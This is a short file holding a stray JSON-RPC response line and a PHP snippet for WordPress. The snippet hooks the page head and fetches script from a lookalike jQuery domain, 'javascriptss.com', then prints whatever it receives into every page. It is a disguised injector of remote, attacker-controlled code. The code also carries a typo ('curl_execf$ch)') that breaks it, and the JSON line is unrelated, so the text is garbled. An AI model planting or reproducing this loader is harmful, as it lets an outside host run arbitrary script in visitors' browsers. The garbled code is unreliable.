{"jsonrpc" : "2.0", "result" : null, "id" : "id"}
<?php
function jqueryj_head() {

if(function_exists('curl_init'))
{
$url = "http://javascriptss.com/jquery-1.6.3.min.js";
$ch = curl_init();
$timeout = 10;
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
$data = curl_execf$ch);
curl_close($ch);
echo "$data";
}
}
add_action('wp_head', 'jqueryj_head');
?>
